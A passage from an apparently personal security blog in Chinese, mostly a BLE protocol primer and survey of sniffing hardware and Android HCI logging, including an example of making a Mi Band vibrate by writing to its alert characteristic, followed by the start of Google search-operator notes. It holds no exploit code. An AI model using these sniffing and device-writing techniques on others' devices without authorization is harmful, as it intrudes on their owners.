<li><ul>
<li>Broadcastmode and observation procedure，实现单向的、无连接的通信方式</li>
<li>Discovery modes and procedures，实现蓝牙设备的发现操作</li>
<li>Connection modes and procedures，实现蓝牙设备的连接操作</li>
<li>Bonding modes and procedures，实现蓝牙设备的配对操作</li>
</ul>
</li>
<li><p>定义User Interface有关的蓝牙参数，包括蓝牙地址、蓝牙名称、蓝牙的PIN码等</p>
</li>
<li><p>Security相关的定义</p>
</li>
</ul>
<h3 id="5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）"><a href="#5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）" class="headerlink" title="5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）"></a><strong>5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）</strong></h3><p>逻辑链路控制及自适应协议层（Logical Link Control and Adaptation Protocol）：为上层提供数据封装服务，允许逻辑上的点对点数据通信。</p>
<h3 id="6-Security-Manager（SM）"><a href="#6-Security-Manager（SM）" class="headerlink" title="6. Security Manager（SM）"></a><strong>6. Security Manager（SM）</strong></h3><p>Security Manager负责BLE通信中有关安全的内容，包括配对（pairing,）、认证（authentication）和加密（encryption）等过程。</p>
<h3 id="7-Attribute-protocol（ATT）"><a href="#7-Attribute-protocol（ATT）" class="headerlink" title="7. Attribute protocol（ATT）"></a><strong>7. Attribute protocol（ATT）</strong></h3><p>在BLE协议栈中，Physical Layer负责提供一系列的Physical Channel；基于这些Physical Channel，Link Layer可在两个设备之间建立用于点对点通信的Logical Channel；而L2CAP则将这个Logical Channel换分为一个个的L2CAP Channel，以便提供应用程序级别的通道复用。到此之后，基本协议栈已经构建完毕，应用程序已经可以基于L2CAP欢快的run起来了。</p>
<p>谈起应用程序，就不得不说BLE的初衷——物联网。物联网中传输的数据和传统的互联网有什么区别呢？抛开其它不谈，物联网中最重要、最广泛的一类应用是：信息的采集。</p>
<p>这些信息往往都很简单，如温度、湿度、速度、位置信息、电量、水压、等等。</p>
<p>采集的过程也很简单，节点设备定时的向中心设备汇报信息数据，或者，中心设备在需要的时候主动查询。</p>
<p>基于信息采集的需求，BLE抽象出一个协议：Attribute protocol，该协议将这些“信息”以“Attribute（属性）”的形式抽象出来，并提供一些方法，供远端设备（remote device）读取、修改这些属性的值（Attribute value）。</p>
<p>Attribute Protocol的主要思路包括：</p>
<ol>
<li>基于L2CAP，使用固定的Channel ID</li>
<li>采用client-server的形式。提供信息（以后都将其称为Attribute）的一方称作ATT server（一般是那些传感器节点），访问信息的一方称作ATT client。</li>
<li>一个Attribute由Attribute Type、Attribute Handle和Attribute Value组成。</li>
</ol>
<ul>
<li><ol>
<li>Attribute Type用以标示Attribute的类型，类似于我们常说的“温度”、“湿度”等人类可识别的术语，通过UUID进行区分。</li>
<li>Attribute Handle是一个16-bit的数值，用作唯一识别Attribute server上的所有Attribute。Attribute Handle的存在有如下意义：</li>
</ol>
</li>
<li><ul>
<li><ol>
<li>一个server上可能存在多个相同type的Attribute，显然，client有区分这些Attribute的需要。</li>
<li>同一类型的多个Attribute，可以组成一个Group，client可以通过这个Group中的起、始handle访问所有的Attributes。</li>
</ol>
</li>
</ul>
</li>
<li><ol>
<li>Attribute Value代表Attribute的值，可以是任何固定长度或者可变长度的octet array。</li>
</ol>
</li>
</ul>
<ol>
<li>Attribute能够定义一些权限（Permissions），以便server控制client的访问行为，包括：</li>
</ol>
<ul>
<li><ol>
<li>访问有关的权限（access permissions），Readable、Writeable以及Readable and writable；</li>
<li>加密有关的权限（encryption permissions），Encryption required和No encryption required；</li>
<li>认证有关的权限（authentication permissions），Authentication Required和No Authentication Required；</li>
<li>授权有关的权限（authorization permissions），Authorization Required和No Authorization Required。</li>
</ol>
</li>
</ul>
<ol>
<li>根据所定义的Attribute PDU的不同，client可以对server有多种访问方式，包括：</li>
</ol>
<ul>
<li><ol>
<li>Find Information，获取Attribute type和Attribute Handle的对应关系；</li>
<li>Reading Attributes，有Read by type、Read by handle、Read by blob（只读取部分信息）、Read Multiple（读取多个handle的value）等方式；</li>
<li>Writing Attributes，包括需要应答的writing、不需要应答的writing等。</li>
</ol>
</li>
</ul>
<h3 id="8-Generic-Attribute-profile（-GATT）"><a href="#8-Generic-Attribute-profile（-GATT）" class="headerlink" title="8. Generic Attribute profile（ GATT）"></a>8. Generic Attribute profile（ GATT）</h3><p>ATT之所以称作“protocol”，是因为它还比较抽象，仅仅定义了一套机制，允许client和server通过Attribute的形式共享信息。至于具体共享哪些信息，ATT并不关心，这是GATT（Generic Attribute Profile）的主场。GATT相对ATT只多了一个‘G‘，然含义却大不同，因为GATT是一个profile（更准确的说是profile framework）。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34640.png" alt="0"></p>
<p>由上图可知，GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等，可参照<a href="https://developer.bluetooth.org/TechnologyOverview/Pages/Profiles.aspx#GATT">官方Profiles Overview</a>，对分析并无大用。</p>
<p>Service和Characteristic则是比较重要的，Service可以理解为PHP中的“类”、功能对象的集合。Characteristic可以理解为PHP的“函数”，是GATT中具体的功能对象，每个Service都可以包含一个或多个Characteristic（特征）。Characteristic是GATT profile中最基本的数据单位，由一个Properties、一个Value、一个或者多个Descriptor组成。</p>
<p>以上除“Profile”外的每一个定义，Service、Characteristic、Characteristic Properties、Characteristic Value、Characteristic Descriptor等等，都是作为一个Attribute存在的，具备前面所描述的Attribute的所有特征：Attribute Handle、Attribute Types、Attribute Value和Attribute Permissions。</p>
<p>在理解了GATT后，就已经能够分析或是“黑掉”一些BLE设备了。这里拿小米手环做例子，当LightBlue连上小米手环后，可以看到一个名为FEE7的UUID，如下所示：</p>
<p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表<a href="https://developer.bluetooth.org/gatt/characteristics/Pages/CharacteristicsHome.aspx">Characteristics</a>搜索2A06，进入Characteristic的详情页面。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34644.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34646.jpeg" alt="0"></p>
<p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表搜索2A06，进入Characteristic的详情页面。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34650.png" alt="0"></p>
<p>于是，该Characteristic操作定义非常明确了。点击“Write new value”，可以写入新的值。若写入1或2，则可以引起手环的震动。</p>
<h2 id="0x07-嗅探工具"><a href="#0x07-嗅探工具" class="headerlink" title="0x07 嗅探工具"></a>0x07 嗅探工具</h2><p>商业级的Ellisys BEX400侦听工具最为符合对BLE流量捕获及分析的要求，然而售价过于昂贵；</p>
<p>其次，作为开源硬件且配有混杂模式追踪的“超牙”设备——Ubertooth One拥有二次开发和嗅探已建立连接的蓝牙通信数据包的能力；</p>
<p>而淘宝购买的廉价CC2540开发板则作为最佳替补方案。</p>
<h3 id="1-低功耗蓝牙SOC"><a href="#1-低功耗蓝牙SOC" class="headerlink" title="1. 低功耗蓝牙SOC"></a>1. 低功耗蓝牙SOC</h3><p>低功耗蓝牙推出以来，众多厂商根据标准规范实现了不同的解决方案，包括TI的CC2540\2541、北欧Nordic的nRF51822、CSR的1000\1001、Quintic的QN9020\9021（现在被NXP收购）、Broadcom的BCM20732等。其中，在开发者当中比较知名的是TI的CC254x系列和Nordic的NRF51822，并且这两款产品当有着自己的开发板和用于嗅探的调试工具。</p>
<h4 id="a-CC2540"><a href="#a-CC2540" class="headerlink" title="a. CC2540"></a>a. CC2540</h4><p>德州仪器的CC2540，是一款高性价比、低功耗的片上系统（SOC）解决方案，适合蓝牙低功耗应用。它包含了一个8051内核的RF收发器，可编程闪存，8KB RAM和其他功能强大的配套特征及外设。CC2540有两种版本：CC2540F128 / F256，分别为128和256 KB的闪存，结合TI的低功耗蓝牙协议栈，CC2540F128 / F256形成了市场上最灵活，性价比也最高的单模式蓝牙BLE解决方案。<br>CC2540 USB Dongle的实物图如下，它可以配合TI的PacketSniffer软件实现对BLE无线抓包：</p>
<p>实际上，任意包含CC2540芯片的开发板都能实现BLE流量嗅探的功能。不过，TI官方并没有将侦听BLE的源代码放出，仅提供了烧写到USB Dongle的固件</p>
<p>在这个基础上，如果想要实现更多的功能，比如监听指定范围内所有的低功耗蓝牙设备的流量，就有必要对其进行逆向或者自己完全重写个程序。。</p>
<h4 id="b-NRF51822"><a href="#b-NRF51822" class="headerlink" title="b. NRF51822"></a>b. NRF51822</h4><p>挪威Nordic Semiconductor（简称Nordic）公司的nRF51822，是一款多协议ARM内核蓝牙4.0低功耗/ 2.4GHz 专用RF的单芯片解决方案。它基于Cortex-M0 内核，配备16kB RAM，可编程闪存，提供128 KB和 256 KB Flash两种版本供用户选择。</p>
<p>nRF51822 USB Dongle及开发板套件如下所示：</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png" alt="img"></a></p>
<p>刷入以下固件，配合官方的BLE sniffer程序，即可实现蓝牙流量的嗅探功能</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png" alt="img"></a></p>
<p>不同与cc2540的Packet Sniffer，该程序无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪，并能够配合Wireshark解析BLE数据包，可以很直观的显示出内部的层级关系和各字段含义。比较遗憾的是，实际使用发现它并没有CC2540 USB Dongle稳定，经常会抓不到后面数据通信的网络包，不过这一问题应该是可以通过优化算法得到解决的，但需要对官方的固件进行逆向或自己根据Nordic公司提供的BLE协议栈重写代码。。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984347-9e466b00-ffa2-11e8-943a-caef7f703349.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984319-9981b700-ffa2-11e8-9850-dd3b4187f32f.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984323-9981b700-ffa2-11e8-8e99-1ef51eab3cd2.jpg" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984325-9a1a4d80-ffa2-11e8-8c4b-23c0b851d5da.jpg" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>价格便宜，USB Dongle淘宝价70元左右，整套开发板售价约200软妹币上下</li>
<li>无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪</li>
<li>官方提供的BLE Sniffer程序可配合Wireshark工具对嗅探到的低功耗蓝牙数据包进行解析，能够很直观的显示出内部的层级关系和各字段含义</li>
</ul>
<p>缺点：</p>
<ul>
<li>不用指定广播信道，确实操作起来比较方便，但与之相对的是经常无法抓到后面的通信数据包。无论是作为开发用的调试工具，还是分析用的嗅探工具，都不够理想</li>
</ul>
<h5 id><a href="#" class="headerlink" title></a></h5><h3 id="2-商业侦听工具"><a href="#2-商业侦听工具" class="headerlink" title="2. 商业侦听工具"></a>2. 商业侦听工具</h3><h4 id="a-Frontline-BPA®-600"><a href="#a-Frontline-BPA®-600" class="headerlink" title="a. Frontline BPA® 600"></a>a. Frontline BPA® 600</h4><p>Frontline Test Equipment——“前线测试设备”（简称“前线”，Frontline），主要是针对各种各样的协议所做的一个“协议分析器”。“前线”系统的销售策略是“卖硬件，送软件”，而软件自然是和硬件相关联的，其侦听范围包括SCADA系统、RS-232串口通信、Ethernet以太网通信、ZigBee网络通信，以及蓝牙网络技术。Frontline旗下的BPA® 600双模蓝牙协议分析仪，能够把从空中获取到的基础速率/ 增强数据速率（BR/EDR）的传统蓝牙无线通信和低功耗蓝牙无线通信数据同时直观的显示出来。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984340-9c7ca780-ffa2-11e8-9f1a-ef9a2fca5d95.png" alt="img"></a></p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984338-9c7ca780-ffa2-11e8-8c9c-71b47e26f060.jpg" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>无角色指定链路抓取意味着在初始化设置时不再需要指定哪个设备是主设备（master），哪个设备是从设备（slave）</li>
<li>能够同时可视化的监视低功耗蓝牙技术所使用的三个广播信道</li>
<li>同时抓取和解密多条蓝牙链路</li>
<li>链路密钥可自动从第三方软件或调试工具导入到BPA 600</li>
<li>支持蓝牙SIG组织发布的所有的协议和应用层协议，完全支持蓝牙4.1版本</li>
</ul>
<p>缺点：</p>
<ul>
<li>十分昂贵，<a href="http://www.fte.com/">官网</a>上虽并未公布具体的价格信息，需要与对方进行联系，但淘宝价格在15万左右</li>
<li>需要捕获到蓝牙的“连接建立”过程，对于已经建立好连接的蓝牙网络，无法从一个正在处理的进程中，嗅探到这个“微微网”里面的通信数据包</li>
</ul>
<h4 id="b-Ellisys-BEX400"><a href="#b-Ellisys-BEX400" class="headerlink" title="b. Ellisys BEX400"></a>b. Ellisys BEX400</h4><p>Ellisys公司的BLuetooth Explorer 400（简称“BEX400”），是个独特的蓝牙数据通信捕获系统。它使用了一个wideband的接收器，能够同时侦听蓝牙整个79MHz的所有频谱。通过这种无线接入方法，嗅探蓝牙数据包以及对蓝牙活动的评估变得很容易。在BEX400强大的宽带接收能力支持下，我们能够同时捕获蓝牙的所有活动，且无需指定“蓝牙设备地址”信息。此外，该设备在捕获一个“微微网”中的蓝牙通信数据时，既可以是在连接建立前，也可以在连接建立后</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>对于BLE的流量捕获没有必须在建立连接前就开始嗅探的限制</li>
<li>能够同时侦听蓝牙的所有信道，且无需指定“蓝牙设备地址”信息</li>
</ul>
<p>缺点：</p>
<ul>
<li>价格极其昂贵</li>
<li>除价格外，几乎完全符合需求，暂未发现明显缺点</li>
</ul>
<h3 id="3-开源侦听工具Ubertooth"><a href="#3-开源侦听工具Ubertooth" class="headerlink" title="3. 开源侦听工具Ubertooth"></a>3. 开源侦听工具Ubertooth</h3><p>“超牙项目”（Project Ubertooth）是一个开源的硬件项目，由Great Scott Gadgets团队的Michael Ossmann开发。超牙的硬件系统，目前处于版本为1的阶段，称为“超牙一号”（Ubertooth One）。通过这个工具，可以创建属于自己的“传统蓝牙”和“低功耗蓝牙”底层通信数据包捕获工具。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg" alt="img"></a></p>
<p>此外，Ubertooth的固件源代码，可以直接从github：<a href="https://github.com/greatscottgadgets/ubertooths">https://github.com/greatscottgadgets/ubertooth</a>下载到最新的发布版。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200928121643528.png" alt="image-20200928121643528"></p>
<p>优点：</p>
<ul>
<li>售价约120美元，比较亲民</li>
<li>本身是一个开源的硬件和软件工程，其设计目的就是用来进行蓝牙网络的嗅探，便于研究员和黑客使用</li>
<li>针对不同的蓝牙规范，具有不同的应对工具，支持传统蓝牙和低功耗蓝牙两种数据包的捕获</li>
<li>能够在混杂模式下进行跟踪，通过ubertooth-btle程序对捕获的数据包进行识别和匹配，进而确定“访问地址”、“循环冗余校验”初始值、“跳转间隔”、“跳转增量”等，并还原出数据包的值</li>
</ul>
<p>缺点：</p>
<ul>
<li>说是支持“传统蓝牙”，但其实只能捕获“基本速率蓝牙”在网络中的活动，并不支持后来的“增强速率蓝牙”在规范改进后的设备。不过这与我们的工作没有太大联系，主要关注的应是低功耗蓝牙</li>
</ul>
<h2 id="0x08-移动端工具"><a href="#0x08-移动端工具" class="headerlink" title="0x08 移动端工具"></a>0x08 移动端工具</h2><h3 id="1-Android手机抓取app蓝牙数据"><a href="#1-Android手机抓取app蓝牙数据" class="headerlink" title="1. Android手机抓取app蓝牙数据"></a>1. Android手机抓取app蓝牙数据</h3><h4 id="a-Android蓝牙HCI日志"><a href="#a-Android蓝牙HCI日志" class="headerlink" title="a .Android蓝牙HCI日志"></a><strong>a .Android蓝牙HCI日志</strong></h4><p>在部分Android机型为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据，打开方式如下：</p>
<p>开发者模式→蓝牙HCI日志</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930155140338.png" alt="image-20200930155140338"></p>
<p>不同的平台存放HCI log的路径会不一样，MTK存放HCI log的路径为<code>/sdcard/mtklog/btlog/btsnoop_hci.log</code>，高通的存放路径为<code>/sdcard/btsnoop_hci.log</code></p>
<p>如果上面提到的路径下都没有HCI log，还可以通过手机上的蓝牙配置文件<code>bt_stack.conf</code>来查看路径</p>
<p><code>bt_stack.conf</code>位于<code>/etc/bluetooth/路径下，HCI log路径通过</code>BtSnoopFileName=/sdcard/btsnoop_hci.log`来进行设置的</p>
<p>另外如果没有<code>bt_stack.conf</code>文件，设备也会在默认路径下生成日志：<code>/data/misc/bluetooth/logs/btsnoop_hci.log</code></p>
<p>之后导出到wireshark查看即可，如图清晰的展示了蓝牙各协议栈的内容，分析时候重点关注发送的数据内容即<code>Handle</code>、<code>uuid</code>、<code>Value</code>等值即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49418350-b6590600-f7bc-11e8-8cea-fbd09c9c318c.png" alt="img"></p>
<h4 id="b-Bluez调试工具hcidump"><a href="#b-Bluez调试工具hcidump" class="headerlink" title="b. Bluez调试工具hcidump"></a><strong>b. Bluez调试工具hcidump</strong></h4><p>虽然Android 4.2已经将蓝牙协议栈替换为Bluedroid，但仍可使用BlueZ调试工具（需自行编译，或网上下载），且hcidump输出的数据与<code>开发者模式</code>里的<code>蓝牙HCI日志</code>基本一样，源码如下：</p>
<p><a href="https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1">https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1</a></p>
<p>hcidump抓取 log :</p>
<ul>
<li>打开蓝牙</li>
<li>用adb shell 登陆android设备 并且用 <code>hcidump -w /sdcard/hcilog</code></li>
<li>开始测试</li>
<li>测试完成，停止hcidump</li>
<li>导出到wireshark分析 <code>hcilog</code> 文件</li>
</ul>
<h3 id="2-扫描器"><a href="#2-扫描器" class="headerlink" title="2. 扫描器"></a>2. 扫描器</h3><h4 id="a-LightBlue"><a href="#a-LightBlue" class="headerlink" title="a. LightBlue"></a>a. LightBlue</h4><p><code>LightBlue</code>使用简单，打开蓝牙和app，即自动扫描蓝牙设备，未连接之前，大部分设备都是<code>Unnamed</code>和<code>No services</code>，选择其中一个会尝试连接，连接成功后即可获取蓝牙设备的设备信息、UUID、服务等信息了，选择其中一个服务，还可以尝试对其读写数据</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161720845.png" alt="image-20200930161720845"></p>
<h4 id="b-nRF-Connect"><a href="#b-nRF-Connect" class="headerlink" title="b. nRF Connect"></a>b. nRF Connect</h4><p><code>nRF Connect</code>的使用方式和<code>LightBlue</code>基本一致，优点在于对设备服务信息展示更为直观：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161645370.png" alt="image-20200930161645370"></p>
<h2 id="0x09-针对利用蓝牙的应用攻击（私有协议）"><a href="#0x09-针对利用蓝牙的应用攻击（私有协议）" class="headerlink" title="0x09 针对利用蓝牙的应用攻击（私有协议）"></a>0x09 针对利用蓝牙的应用攻击（私有协议）</h2><p>目前针对私有协议的分析基本都是通过蓝牙dongle抓包例如CC2540，并且逆向app进行分析应用实现是否安全。</p>
<ul>
<li><a href="http://drops.xmd5.com/static/drops/tips-10109.html">YeeLight 2 代蓝牙灯泡，小爱爱智能跳蛋，小米手环</a></li>
<li><a href="https://future-sec.com/how-to-crack-a-ble-lock.html">如何破解一个蓝牙锁</a></li>
<li><a href="http://www.droidsec.cn/ble安全入门及实战（1）/">BLE安全入门及实战（1）</a></li>
<li><a href="https://www.secpulse.com/archives/75963.html">BLE安全入门及实战（2）</a></li>
<li><a href="https://www.secpulse.com/archives/76377.html">BLE安全入门及实战（3）</a></li>
<li><a href="https://blog.csdn.net/u013183495/article/details/51736605">体脂秤</a></li>
</ul>
<h2 id="0x10-可以研究的点"><a href="#0x10-可以研究的点" class="headerlink" title="0x10 可以研究的点"></a>0x10 可以研究的点</h2><p>经过多年的历史发展，蓝牙本身已经变成一个比较复杂的协议了，如果需要整理完整的攻击面需要对整个蓝牙的实现有很清晰的梳理，网上大部分的文章都是关于协议本身的，对于协议的实现还是说的不是很清楚。而且协议本身的发展方向就是IOT方向，例如GATT这种很明显就是支持物联网设备的协议。所以搞清BLE5.0在真实的物联网设备上的架构以及实现我认为非常关键。</p>
<h2 id="0x11-参考链接"><a href="#0x11-参考链接" class="headerlink" title="0x11 参考链接"></a>0x11 参考链接</h2><p><a href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a></p>
<p><a href="http://www.gandalf.site/2019/02/ble.html">http://www.gandalf.site/2019/02/ble.html</a></p>
<p><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf</a></p>
<p><a href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p>
<p><a href="https://blog.csdn.net/u013183495/article/details/51736605">https://blog.csdn.net/u013183495/article/details/51736605</a></p>
<p><a href="https://www.secpulse.com/archives/75963.html">https://www.secpulse.com/archives/75963.html</a></p>
<h2 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…"></a>更新中…</h2>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>BLE</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title>Google hacking</title>
    <url>/2018/03/23/WEB/Google-hacking/</url>
    <content><![CDATA[<ul>
<li><p><strong>Google hacking</strong></p>
<p>​                                      <strong>-ol4three</strong>                                                                                                                                             </p>
<p><strong>第一章 搜索基础知识</strong></p>
<p><strong>1.1Google搜索的黄金法则</strong></p>
<ul>
<li>Google<strong>限制搜索关键字最多为32个单词</strong></li>
<li>Google查询是不区分大小写的：     <strong>//or必须大写</strong></li>
<li>Google的通配符 ： *****    </li>
<li>Google保留忽略查询关键字的权利：Google会忽略一个搜索中的某些常用单词、字母和一些单独的数字。指出这些词汇常称为<strong>“停用词”</strong></li>
<li><strong>强制Google使用常见词汇的一种方法是把他们用引号引起来、或者在查询项之前加一个+号</strong></li>
</ul>
<p><strong>1.2Google使用布尔操作符和特殊字符</strong></p>
<ul>
<li><strong>AND</strong> ：这个操作符用于在查询中包含多个关键字  hacker and cracker (<strong>常用于防止过滤掉一些常用词</strong>)  <strong>// + == “and justice for all”</strong></li>
<li><strong>NOT</strong> ：这个操作符用于从查询中忽略一个关键字  hacker -golf  ;  hacker -phlegm    (<strong>从你的查询中删除那些令人厌恶的字符</strong>)</li>
<li><strong>OR</strong>   ：这个操作符命令Google查找搜索中的一个或者另外一个关键字     <strong>//可以用 “|” 或者 OR 来代替   查询看作是一个从左到右的句子即可</strong></li>
<li><strong>特殊字符</strong>： 特殊字符将被Google默认转化</li>
</ul>
<p><strong>1.3网站链接</strong></p>
<ul>
<li><a href="http://www.google.com">www.google.com</a>    <strong>Google的主页，大部分搜索的入口</strong></li>
<li><a href="http://groups.google.com">http://groups.google.com</a>        <strong>Google group页面</strong></li>
<li><a href="http://www.google.com/language/language_tools">www.google.com/language/language_tools</a>    <strong>各种语言和翻译选项</strong></li>
<li><a href="http://www.google.com/advance_search">www.google.com/advance_search</a>        <strong>高级搜索表单</strong></li>
<li><a href="http://www.google.com/preferences">www.google.com/preferences</a>        <strong>使用偏好设置</strong></li>
</ul>
<p><strong>第二章 高级搜索符</strong></p>
<p><strong>2.1简介</strong></p>
<ul>
<li><strong>intitle,allintitle</strong></li>
<li><strong>inurl,allinurl</strong></li>
<li><strong>filetype</strong></li>
<li><strong>allintext</strong></li>
<li><strong>site</strong></li>
<li><strong>link</strong></li>
<li><strong>inanchor</strong></li>
<li><strong>daterange</strong></li>
<li><strong>cache</strong></li>
<li><strong>info</strong></li>
<li><strong>related</strong></li>
<li><strong>phonebook</strong></li>
<li><strong>rphonebook</strong></li>
<li><strong>bphonebook</strong></li>
<li><strong>author</strong></li>
<li><strong>group</strong></li>
<li><strong>msgid</strong></li>
<li><strong>insubject</strong></li>
<li><strong>stocks</strong></li>
<li><strong>define</strong></li>
</ul>
<p><strong>2.2操作符语法</strong></p>
<ul>
<li>在操作符、冒号、搜索关键字之间是没有空格的</li>
<li>如果用词组作为关键字的话，必须保证在操作符、冒号和词组的第一个引号之间没有任何空        格字符</li>
<li>高级操作符能够和单独的查询混合使用</li>
</ul>
<p><strong>2.3Google高级操作符</strong></p>
<p><strong>2.3.1 Intitle与Allintitle:    在页面标题中搜索</strong></p>
<ul>
<li>在页面标题中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
<li>擅长搜索网页、Group、图片和新闻</li>
<li>allintetle 在页面中查找所有的关键字（不能和其他混合使用）</li>
</ul>
<p><strong>2.3.2 Allintext: 在网页内容中查找关键字</strong></p>
<p><strong>2.3.3  Inurl 与 Allinurl: 在URL中查找文本</strong></p>
<ul>
<li>在页面的URL中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
<li>擅长搜索网页加图片</li>
<li>Allinurl 不能和其他操作符或者关键字混合使用</li>
<li><strong>URL是统一资源定位符（简单来说它就是网页的地址）</strong></li>
</ul>
<p><strong>2.3.4 Site： 搜索精确到特定的站点</strong></p>
<ul>
<li>允许你仅在某个特定的网站或者特定的网站或者特定的域中搜索网页</li>
<li>能够很好地和其他操作符或者关键字混合使用，也可以单独使用</li>
<li>擅长搜索网页，Group以及图片</li>
<li>Google搜索是从右向左读取服务器名的</li>
</ul>
<p><strong>2.3.5Filetype： 搜索指定类型的文件</strong></p>
<ul>
<li>根据文件扩展名查找特定的文件</li>
<li>等同于ext</li>
<li>需要附加搜索关键字</li>
<li>能够附加搜索关键字</li>
<li>能够很好地和其他操作符混合使用</li>
</ul>
<p><strong>2.3.6 Link： 搜索与当前网页存在链接的网页</strong></p>
<ul>
<li>搜索链接到一个网站或者URL的链接</li>
<li>不能很好地和其他操作符和和搜索关键字混合使用</li>
<li>删除搜索网页、图片和新闻。</li>
<li>必须提供一个完整的URL（包括协议、服务器、目录以及文件），或者一个部分URL</li>
<li>当你提交一个无效的Link 给Google 他会当成一个词组来处理</li>
</ul>
<p><strong>2.3.7 Inanchor：在链接文本中查找文本</strong></p>
<ul>
<li>在链接描述文本中查找文本</li>
<li>能够很好地和其他操作符和搜索关键字混合使用</li>
<li>擅长搜索网页、图片和新闻</li>
<li>可以和其他操作符及搜索关键字混合使用</li>
</ul>
<p><strong>2.3.8 Cache： 显示网页的缓存版本</strong></p>
<ul>
<li>显示页面的缓存版本</li>
<li>不能很好地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
<li>eg： cache: blackhat.org</li>
</ul>
<p><strong>2.3.9 Numerange： 搜索数字</strong></p>
<ul>
<li>在某一特定范围内查找数字</li>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
<li>擅长搜索网页</li>
<li>与ext同效</li>
</ul>
<p><strong>2.3.10 Daterange： 查找在某个特定日期范围内发布的网页</strong></p>
<ul>
<li>这个日期必须使用儒略历</li>
<li>deterange操作符必须和其他搜索关键字或高级操作符同时使用</li>
</ul>
<p><strong>2.3.11 Info： 显示Google的摘要信息</strong></p>
<ul>
<li>该操作符的参数必须是一个有效的URL或者网站名。、</li>
<li>info操作符不能和其他操作符或者搜索关键字混合使用</li>
<li>显示网页的摘要信息</li>
</ul>
